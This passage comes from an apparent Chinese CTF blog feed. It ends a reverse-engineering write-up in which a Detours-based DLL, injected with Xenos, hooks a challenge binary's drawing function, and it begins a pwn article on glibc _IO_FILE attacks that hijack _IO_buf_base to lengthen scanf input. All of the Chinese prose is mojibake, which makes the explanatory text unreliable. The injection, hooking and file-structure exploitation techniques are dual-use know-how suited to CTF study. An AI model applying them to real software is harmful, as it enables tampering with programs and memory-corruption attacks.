class="literal">NULL</span>);</span><br><span class="line">    BYTE buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;ProcessBase: 0x%llx\n&quot;</span>, (__int64)ProcessBase);</span><br><span class="line">    <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">    dec_func += (__int64)ProcessBase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), (LPCVOID*)dec_func, &amp;to_hook, <span class="built_in">sizeof</span>(__int64), <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        __int64 err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        BYTE buffer[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;ReadProcessMemory failed, error code: %llx\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">        <span class="built_in">fclose</span>(log_file);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pto_hook = (to_hook - <span class="number">0x650</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;to_hook: 0x%llx\n&quot;</span>, pto_hook);</span><br><span class="line">    <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>GetModuleHandle(NULL)</code>å¯ä»¥è·å–ç¨‹åºæ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„åŸºå€ ä½¿ç”¨<code>ReadProcessMemory()</code>å¯ä»¥è·å–ä¸€ä¸ªåœ°å€ä¸­çš„æ•°æ®</p>
<p>è¿™é‡Œå†è®²ä¸€ä¸ªè¸©åˆ°çš„å‘ åœ¨è·Ÿç€ç½‘ä¸Šçš„wpå¤ç°æ—¶çœ‹åˆ°è¯»å–çš„å†…å­˜åœ°å€ç›´æ¥å°±æ˜¯0x140008318 åº”è¯¥æ˜¯å› ä¸ºæœºå™¨æ²¡å¼€ASLR æ­£å¸¸æƒ…å†µä¸‹éœ€è¦å…ˆè·å–çœŸæ­£çš„è™šæ‹Ÿåœ°å€æ‰èƒ½è¯»åˆ°æ•°æ®</p>
<h5 id="PS-2025-3-30"><a href="#PS-2025-3-30" class="headerlink" title="PS | 2025&#x2F;3&#x2F;30"></a>PS | 2025&#x2F;3&#x2F;30</h5><p>å®é™…ä¸Šå¹¶ä¸æ˜¯æœºå™¨çš„é—®é¢˜ Windowså¯¹äºç¨‹åºæœ¬èº«æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„åŸºå€å’ŒLinuxä¸­çš„PIEä¸€æ ·åªéœ€è¦ä¿®æ”¹äºŒè¿›åˆ¶æ–‡ä»¶æœ¬èº«å°±è¡Œäº† å¯¹äºPEæ–‡ä»¶ ä½¿ç”¨010çš„<code>EXE.bt</code>æ¨¡æ¿ä¿®æ”¹ä»¥ä¸‹ç¨‹åºå¤´çš„å­—æ®µå³å¯ä½¿å…¶ä»¥å›ºå®šçš„åŸºå€è¢«è½½å…¥è™šæ‹Ÿå†…å­˜:</p>
<p><code>NtHeader-&gt;OptionalHeader-&gt;DllCharacteristics-&gt;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE : 1</code></p>
<p>å°†å­—æ®µè®¾ç½®ä¸º0å³å¯å…³é—­éšæœºæ˜ å°„</p>
<p>è‡³æ­¤æˆ‘ä»¬è·å–åˆ°äº†è¦hookçš„å‡½æ•°åœ°å€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-132625.png" alt="image-20250326132625777"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç¼–å†™è‡ªå·±çš„å‡½æ•°æ¥hookç»˜åˆ¶å‡½æ•° æˆ‘ä»¬éœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªç›®æ ‡å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆç±»å‹æ¥æ–¹ä¾¿åç»­è°ƒç”¨åŸæœ¬çš„ç»˜åˆ¶å‡½æ•°:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> __int64 (* pfunc)(__int64, __int64, __int64, __int64, <span class="type">int</span>, __int64, __int64, __int64, __int64, __int64);</span><br><span class="line">pfunc pto_hook;</span><br><span class="line"></span><br><span class="line">__int32 Correct_y_pos[] = &#123; <span class="number">50</span>, <span class="number">110</span>, <span class="number">170</span>, <span class="number">230</span>, <span class="number">290</span>, <span class="number">350</span>, <span class="number">230</span>, <span class="number">230</span>, <span class="number">230</span>, <span class="number">110</span>, <span class="number">170</span> &#125;,</span><br><span class="line">        Correct_x_pos[] = &#123; <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">110</span>, <span class="number">170</span>, <span class="number">230</span>, <span class="number">110</span>, <span class="number">170</span> &#125;,</span><br><span class="line">        Correct_a3[]    = &#123; <span class="number">0xf814b4</span>, <span class="number">0x1bcd69</span>, <span class="number">0x87a34b</span>, <span class="number">0x1cf400</span>, <span class="number">0x391faa</span>, <span class="number">0xebe72</span>, <span class="number">0x71150</span>, <span class="number">0xc7371b</span>, <span class="number">0x34cf2b</span>, <span class="number">0xd1b52d</span>, <span class="number">0xb36fdf</span> &#125;,</span><br><span class="line">        Correct_a4[]    = &#123; <span class="number">0x130bd0</span>, <span class="number">0x7515c9</span>, <span class="number">0xd91997</span>, <span class="number">0xe82b18</span>, <span class="number">0x520efe</span>, <span class="number">0xd77de2</span>, <span class="number">0x788404</span>, <span class="number">0xc42e8b</span>, <span class="number">0x5b8fe7</span>, <span class="number">0xd9e5f1</span>, <span class="number">0xc42d8b</span> &#125;,</span><br><span class="line">        Switch[]	    = &#123; <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span> &#125;,</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">my_hook</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a5 == <span class="number">0xFFFFFF00</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count % <span class="number">11</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a1 = Correct_x_pos[count];</span><br><span class="line">        a2 = Correct_y_pos[count];</span><br><span class="line">        a3 = Correct_a3[count];</span><br><span class="line">        a4 = Correct_a4[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">7</span>; idx++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count == Switch[idx]) &#123;</span><br><span class="line">                a3 ^= a4;</span><br><span class="line">                a4 ^= a3;</span><br><span class="line">                a3 ^= a4;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pto_hook</span>(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè°ƒç”¨detoursä¸­çš„hookå‡½æ•°æ¥å°†ç»˜åˆ¶å‡½æ•°æ›¿æ¢ä¸ºè‡ªå·±çš„å‡½æ•°:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DetourAttach</span>((PVOID*)&amp;pto_hook, my_hook);</span><br><span class="line"><span class="built_in">DetourTransactionCommit</span>();</span><br></pre></td></tr></table></figure>

<p>ç®€å•é€šè¿‡ç ”ç©¶è¿™ä¸ªhookçš„åŸç†æ¥è§£é‡Šä¸€ä¸‹å¦‚ä½•è°ƒè¯•ç¼–è¯‘å‡ºçš„dll</p>
<h4 id="è°ƒè¯•DLL"><a href="#è°ƒè¯•DLL" class="headerlink" title="è°ƒè¯•DLL"></a>è°ƒè¯•DLL</h4><p>å…ˆåœ¨dllä¸­ä¸‹å¥½æ–­ç‚¹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-133448.png" alt="image-20250326133448888"></p>
<p>æ¥ä¸‹æ¥å¯åŠ¨å®¿ä¸»ç¨‹åºå¹¶é™„åŠ è°ƒè¯•åˆ°å®¿ä¸»ç¨‹åº:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-133753.png" alt="image-20250326133753016"></p>
<p>ç”¨æ³¨å…¥å™¨(è¿™é‡Œé€‰æ‹©<a href="https://github.com/DarthTon/Xenos">Xenos</a>)å°†dllæ³¨å…¥åˆ°å®¿ä¸»ç¨‹åºä¸­å³å¯å¼€å§‹è°ƒè¯•</p>
<p>æ‰§è¡Œå®Œ<code>DetourTransactionCommit()</code>æäº¤äº†ä¿®æ”¹åæŸ¥çœ‹ç»˜åˆ¶å‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-134748.png" alt="image-20250326134748667"></p>
<p>å¯ä»¥çœ‹åˆ°å‡½æ•°å¤´è¢«ä¿®æ”¹ä¸ºäº†è·³è½¬åˆ°æˆ‘ä»¬ç¼–å†™çš„ç”¨æˆ·å‡½æ•°çš„å­—èŠ‚ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-134904.png" alt="image-20250326134904783"></p>
<p>æ‰§è¡Œå®Œåä¼šè·³è½¬åˆ°ä¸€å—æ³¨å…¥å™¨åˆ›å»ºçš„å†…å­˜æ‰§è¡Œè¢«è¦†ç›–çš„å‡½æ•°å¤´ç„¶åè·³è½¬å›ç»˜åˆ¶å‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-135024.png" alt="image-20250326135024510"></p>
<h3 id="æ³¨å…¥DLL"><a href="#æ³¨å…¥DLL" class="headerlink" title="æ³¨å…¥DLL"></a>æ³¨å…¥DLL</h3><p>ç”¨ä¸Šé¢æåˆ°çš„<code>Xenos</code>è¿›è¡Œdllæ³¨å…¥ åœ¨<code>Advanced</code>ä¸­è®¾ç½®(å…¶å®æ˜¯é»˜è®¤çš„)æ³¨å…¥çš„æ–¹æ³•ä¸º<code>Native inject</code>æ–¹å¯è¿›è¡Œä¸Šè¿°çš„è°ƒè¯• ä½¿ç”¨<code>Manual map</code>çš„æ–¹æ³•æ— æ³•è¿›è¡Œä¸Šè¿°æ–¹æ³•çš„è°ƒè¯•</p>
<p>æœ€åé™„ä¸Šå®Œæ•´dllä»£ç ä»¥åŠæˆæœ:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (* pfunc)(__int64, __int64, __int64, __int64, <span class="type">int</span>, __int64, __int64, __int64, __int64, __int64);</span><br><span class="line">pfunc pto_hook;</span><br><span class="line">__int64 dec_func = <span class="number">0x8318</span>;</span><br><span class="line">FILE* log_file = <span class="built_in">fopen</span>(<span class="string">&quot;log_.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">__int32 Correct_y_pos[] = &#123; <span class="number">50</span>, <span class="number">110</span>, <span class="number">170</span>, <span class="number">230</span>, <span class="number">290</span>, <span class="number">350</span>, <span class="number">230</span>, <span class="number">230</span>, <span class="number">230</span>, <span class="number">110</span>, <span class="number">170</span> &#125;,</span><br><span class="line">        Correct_x_pos[] = &#123; <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">110</span>, <span class="number">170</span>, <span class="number">230</span>, <span class="number">110</span>, <span class="number">170</span> &#125;,</span><br><span class="line">        Correct_a3[]    = &#123; <span class="number">0xf814b4</span>, <span class="number">0x1bcd69</span>, <span class="number">0x87a34b</span>, <span class="number">0x1cf400</span>, <span class="number">0x391faa</span>, <span class="number">0xebe72</span>, <span class="number">0x71150</span>, <span class="number">0xc7371b</span>, <span class="number">0x34cf2b</span>, <span class="number">0xd1b52d</span>, <span class="number">0xb36fdf</span> &#125;,</span><br><span class="line">        Correct_a4[]    = &#123; <span class="number">0x130bd0</span>, <span class="number">0x7515c9</span>, <span class="number">0xd91997</span>, <span class="number">0xe82b18</span>, <span class="number">0x520efe</span>, <span class="number">0xd77de2</span>, <span class="number">0x788404</span>, <span class="number">0xc42e8b</span>, <span class="number">0x5b8fe7</span>, <span class="number">0xd9e5f1</span>, <span class="number">0xc42d8b</span> &#125;,</span><br><span class="line">        Switch[]	    = &#123; <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span> &#125;,</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">my_hook</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a5 == <span class="number">0xFFFFFF00</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count % <span class="number">11</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a1 = Correct_x_pos[count];</span><br><span class="line">        a2 = Correct_y_pos[count];</span><br><span class="line">        a3 = Correct_a3[count];</span><br><span class="line">        a4 = Correct_a4[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">7</span>; idx++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count == Switch[idx]) &#123;</span><br><span class="line">                a3 ^= a4;</span><br><span class="line">                a4 ^= a3;</span><br><span class="line">                a3 ^= a4;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pto_hook</span>(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Start_Hook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DetourRestoreAfterWith</span>();</span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    __int64 to_hook = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE ProcessBase = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    BYTE buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;ProcessBase: 0x%llx\n&quot;</span>, (__int64)ProcessBase);</span><br><span class="line">    <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">    dec_func += (__int64)ProcessBase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), (LPCVOID*)dec_func, &amp;to_hook, <span class="built_in">sizeof</span>(__int64), <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        __int64 err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        BYTE buffer[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;ReadProcessMemory failed, error code: %llx\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">        <span class="built_in">fclose</span>(log_file);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pto_hook = (pfunc)(to_hook - <span class="number">0x650</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span>*)buffer, <span class="string">&quot;to_hook: 0x%llx\n&quot;</span>, (__int64)pto_hook);</span><br><span class="line">    <span class="built_in">fwrite</span>((<span class="type">char</span>*)buffer, <span class="number">1</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)buffer), log_file);</span><br><span class="line">    <span class="built_in">DetourAttach</span>((PVOID*)&amp;pto_hook, my_hook);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Exit_Hook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)dec_func, (PVOID)pto_hook);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">    <span class="built_in">fclose</span>(log_file);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">Start_Hook</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="built_in">Exit_Hook</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-135539.png" alt="QQ_1742968537073"></p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>IO FILEæ”»å‡»</title>
    <url>/2025/02/25/IO-FILE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>Pwnè¿›é˜¶æŠ€å·§(å¤§æ¦‚?</p>
<span id="more"></span>

<p><code>_IO_FILE</code>ç»“æ„ä½“:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> // <span class="title">sizeof</span>=</span><span class="number">0xD8</span></span><br><span class="line"><span class="number">00000000</span> &#123;</span><br><span class="line"><span class="number">00000000</span>     <span class="type">int</span> _flags;</span><br><span class="line"><span class="number">00000004</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000005</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000006</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000007</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000008</span>     <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="number">00000020</span>     <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="number">00000028</span>     <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="number">00000030</span>     <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="number">00000038</span>     <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="number">00000040</span>     <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="number">00000048</span>     <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="number">00000050</span>     <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="number">00000058</span>     <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="number">00000060</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="number">00000068</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="number">00000070</span>     <span class="type">int</span> _fileno;</span><br><span class="line"><span class="number">00000074</span>     <span class="type">int</span> _flags2;</span><br><span class="line"><span class="number">00000078</span>     <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="number">00000080</span>     <span class="type">unsigned</span> __int16 _cur_column;</span><br><span class="line"><span class="number">00000082</span>     <span class="type">signed</span> __int8 _vtable_offset;</span><br><span class="line"><span class="number">00000083</span>     <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="number">00000084</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000085</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000086</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000087</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000088</span>     _IO_lock_t *_lock;</span><br><span class="line"><span class="number">00000090</span>     <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="number">00000098</span>     <span class="type">void</span> *__pad1;</span><br><span class="line"><span class="number">000000</span>A0     <span class="type">void</span> *__pad2;</span><br><span class="line"><span class="number">000000</span>A8     <span class="type">void</span> *__pad3;</span><br><span class="line"><span class="number">000000B</span>0     <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="number">000000B</span>8     <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="number">000000</span>C0     <span class="type">int</span> _mode;</span><br><span class="line"><span class="number">000000</span>C4     <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"><span class="number">000000</span>D8 &#125;;</span><br></pre></td></tr></table></figure>

<p>å¾ˆå¤šé«˜çº§çš„IOåº“å‡½æ•°(ä¾‹å¦‚<code>printf()</code>, <code>scanf()</code>)åº•å±‚å®ç°éƒ½ä¾èµ–è¿™ä¸ªç»“æ„ä½“ä¸­çš„æ•°æ® </p>
<h2 id="åŠ«æŒ-IO-buf-base-æ§åˆ¶scanfè¾“å…¥é‡"><a href="#åŠ«æŒ-IO-buf-base-æ§åˆ¶scanfè¾“å…¥é‡" class="headerlink" title="åŠ«æŒ _IO_buf_base æ§åˆ¶scanfè¾“å…¥é‡"></a>åŠ«æŒ _IO_buf_base æ§åˆ¶scanfè¾“å…¥é‡</h2><p><code>_IO_buf_base</code>å’Œ<code>_IO_buf_end</code>åˆ†åˆ«æŒ‡å‘å½“å‰ç¼“å†²åŒºçš„å¼€å§‹å’Œç»“æŸåœ°å€ åœ¨ç¨‹åºè¿˜æ²¡è°ƒç”¨è¿‡é«˜çº§IOå‡½æ•°æ—¶è¢«åˆå§‹åŒ–ä¸ºNULL è€Œç»è¿‡è°ƒç”¨ååº•å±‚çš„<code>_IO_file_xsgetn()</code>å‡½æ•°ä¸­ç»è¿‡<code>if (fp-&gt;_IO_buf_base == NULL)</code>åˆ¤æ–­ä¸é€šè¿‡åä¼šè°ƒç”¨<code>_IO_doallocbuf</code>è¿›è¡Œç¼“å†²åŒºçš„åˆå§‹åŒ–</p>
<p><code>_IO_read_ptr</code>å’Œ<code>_IO_read_end</code>åˆ†åˆ«æŒ‡å‘è¦ä»æ­¤è¯»å…¥æ•°æ®åˆ°ç›®æ ‡åœ°å€çš„ç¼“å†²åŒºçš„åœ°å€å’Œç»“æŸåœ°å€ å½“<code>_IO_read_end &gt; _IO_read_ptr</code>æˆç«‹æ—¶æ„å‘³ç€ç¼“å†²åŒºä¸­è¿˜æœ‰æœªå¤åˆ¶åˆ°ç”¨æˆ·æŒ‡å®šç›®æ ‡åœ°å€çš„æ•°æ® è¿™æ—¶å€™è¿›è¡Œè¯»æ“ä½œæ—¶å°±ä¼šå°†è¿™äº›æ•°æ®å¤åˆ¶åˆ°ç›®æ ‡åœ°å€ç„¶åè¿”å› è¿™å°±æ˜¯æœ‰äº›ç¨‹åºåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸€å¥è¯æ—¶æ¢è¡Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥èµ·ä½œç”¨çš„åŸå› </p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬èƒ½æ§åˆ¶<code>stdin</code>çš„IO FILEæ—¶ å°±èƒ½æŒ‡å®šå‘æŸå¤„å†…å­˜è¾“å…¥æ•°æ®æˆ–ä»æŸå¤„å†…å­˜è¯»å…¥æ•°æ®åˆ°ç›®æ ‡åœ°å€ å…¶ä¸­ä¸€ä¸ªå…·ä½“ç”¨é€”å°±æ˜¯æ§åˆ¶<code>scanf()</code>çš„è¾“å…¥é•¿åº¦ å› ä¸º<code>scanf()</code>åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸º<code>%d</code>, <code>%c</code>, <code>%i</code>ç­‰æ—¶å°±ä¼šå°†<code>_IO_buf_base</code>æŒ‡å‘<code>_shortbuf</code> è€Œ<code>_IO_buf_end</code>ä¼šæŒ‡å‘<code>_shortbuf + 1</code> å¯¼è‡´åªæœ‰1å­—èŠ‚çš„è¾“å…¥é‡ å¦‚æœä¿®æ”¹<code>_IO_buf_base</code>æˆ–<code>_IO_buf_end</code>å°±èƒ½è·å¾—æ›´é•¿çš„è¾“å…¥é‡</p>
<p><code>scanf()</code>åœ¨æ¡ä»¶ç¬¦åˆçš„æƒ…å†µä¸‹æœ€åæ‰§è¡Œçš„ç­‰ä»·äº<code>read(0, _IO_buf_base, _IO_buf_end - _IO_buf_base)</code></p>
<h3 id="åº”ç”¨ä¸¾ä¾‹"><a href="#åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹"></a>åº”ç”¨ä¸¾ä¾‹</h3><h4 id="æ”»é˜²ä¸–ç•Œ-echo-back"><a href="#æ”»é˜²ä¸–ç•Œ-echo-back" class="headerlink" title="[æ”»é˜²ä¸–ç•Œ] echo_back"></a>[æ”»é˜²ä¸–ç•Œ] echo_back</h4><p>ä¸»å‡½æ•°ä¼ªä»£ç :</p>
